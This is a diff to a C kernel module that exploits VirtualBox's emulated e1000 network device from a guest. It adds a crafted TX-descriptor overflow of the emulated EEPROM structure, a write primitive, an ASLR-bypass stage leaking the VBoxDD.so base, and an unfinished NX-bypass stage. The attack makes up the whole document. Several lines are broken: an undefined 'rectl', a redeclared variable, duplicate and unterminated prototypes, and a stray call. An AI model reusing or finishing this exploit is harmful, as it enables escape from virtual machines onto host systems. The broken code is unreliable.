@@ -28,9 +28,12 @@ static int __init e1k_init(void);
 static void __exit e1k_exit(void);
 static uint8_t* map_mmio(void);
 static void e1k_configure(void);
-static void address_overflow(uint16_t new_addr);
+static void heap_overflow(uint16_t new_addr);
+static void buffer_overflow(uint64_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
 static uint64_t aslr_bypass(void);
+static void buffer_overflow(uint64_t new_addr);
+static void nx_bypass(void)
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
 uint8_t* bar0;
@@ -130,10 +133,10 @@ static void e1k_configure(void)
 	set_register(TCTL, tctl);
 }
 
-/** address_overflow : erase EEPROM writing address with new one
+/** heap_overflow : erase EEPROM writing address with new one
  * @param new_addr	new adress to write in EEPROM
  */
-static void address_overflow(uint16_t new_addr)
+static void heap_overflow(uint16_t new_addr)
 {
 	static int	idx = 0;
 	uint32_t	tdt;
@@ -276,7 +279,7 @@ static void write_primitive(uint16_t address, uint16_t value)
 	}
 
 	// 4. Overflow EEPROM writing address
-	address_overflow(address);
+	heap_overflow(address);
 	mdelay(3000);
 	
 	// 5. Write value thanks to legit operation into our overflowed address.
@@ -304,13 +307,15 @@ static uint64_t aslr_bypass(void)
 {
     pr_info("##### Stage 1 #####\n");
 
-    // e1000_disable_loopback_mode(mmio);
+    // Configure no loopback mode
+	uint32_t rctl = get_register(RCTL) | RCTL_LBM_NO;
+	set_register(RCTL, rectl);
 
     uint8_t leaked_bytes[8];
     uint32_t i;
     for (i = 0; i < 8; i++) {
         write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
-        leaked_bytes[i] = inb(0x4107);
+        leaked_bytes[i] = read_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);inb(0x4107);
 
         pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
     }
@@ -322,4 +327,89 @@ static uint64_t aslr_bypass(void)
     pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 
     return vboxdd_base;
+}
+
+static void buffer_overflow(uint64_t new_addr)
+{
+static int	idx = 0;
+	uint32_t	tdt;
+	uint64_t 	physical_address;
+
+	struct e1000_context_desc*	context_1	= 	&(tx_ring[idx+0].context);
+	struct e1000_data_desc*		data_2		= 	&(tx_ring[idx+1].data);
+	struct e1000_data_desc*		data_3		= 	&(tx_ring[idx+2].data);
+	struct e1000_context_desc*	context_4	= 	&(tx_ring[idx+3].context);
+	struct e1000_data_desc*		data_5		= 	&(tx_ring[idx+4].data);
+
+	//------------- Payload setup -------------//
+	
+	/* We will overflow on EEProm Struct. Looks like 
+	 *		...
+	 * 		- enum		m_eState			(32 bits)
+	 *		- bool		m_fWriteEnabled		(08 bits)
+	 * 		- uint8_t 	Alignment1			(08 bits)
+     *		- uint16_t	m_u16Word			(16 bits)
+     *		- uint16_t	m_u16Mask			(16 bits)
+     *		- uint16_t	m_u16Addr			(16 bits)
+	 * 		... 
+     */
+    tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
+    tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
+    tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
+    tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
+	tx_buffer[PAYLOAD_LEN - 8]	= 0x01;
+    tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
+    tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
+	tx_buffer[PAYLOAD_LEN - 2]	= low16(new_addr);
+	tx_buffer[PAYLOAD_LEN - 1]	= high16(new_addr);
+	//-----------------------------------------//
+
+	//----------- Descriptors setup -----------//
+	physical_address = virt_to_phys(tx_buffer);
+
+	context_1->lower_setup.ip_config	= 	(uint32_t) 0;
+	context_1->upper_setup.tcp_config	= 	(uint32_t) 0;
+	context_1->cmd_and_length			= 	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
+	context_1->tcp_seg_setup.data		= 	(uint32_t) (MSS_DEFAULT);
+
+	data_2->buffer_addr					= 	(uint64_t) physical_address;
+	data_2->lower.data					= 	(uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
+	data_2->upper.data					= 	(uint32_t) 0;
+
+	data_3->buffer_addr					= 	(uint64_t) physical_address;
+	data_3->lower.data					= 	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
+	data_3->upper.data					= 	(uint32_t) 0;
+
+	context_4->lower_setup.ip_config	=	(uint32_t) 0;
+	context_4->upper_setup.tcp_config	=	(uint32_t) 0;
+	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
+	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));
+
+	data_5->buffer_addr					=	(uint64_t) physical_address;
+	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
+	data_5->upper.data					= 	(uint32_t) 0;
+	//-----------------------------------------//
+
+	//--------- Fetch new descriptors ---------//
+	idx += 5;
+	tdt = (get_register(TDT) + 5) & 0xFFFF;
+	set_register(TDT, tdt);
+	//-----------------------------------------//
+}
+
+static void nx_bypass(void)
+{
+	pr_info("##### Stage 2 #####\n");
+
+	// Set loopback mode
+	uint32_t rctl = get_register(RCTL) | RCTL_LBM_MAC | RCTL_LBM_SLP;
+	set_register(RCTL, rectl);
+
+
+
+	// Disable loopback mode
+	uint32_t rctl = get_register(RCTL) & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
+	set_register(RCTL, rectl);
+
+	
 }
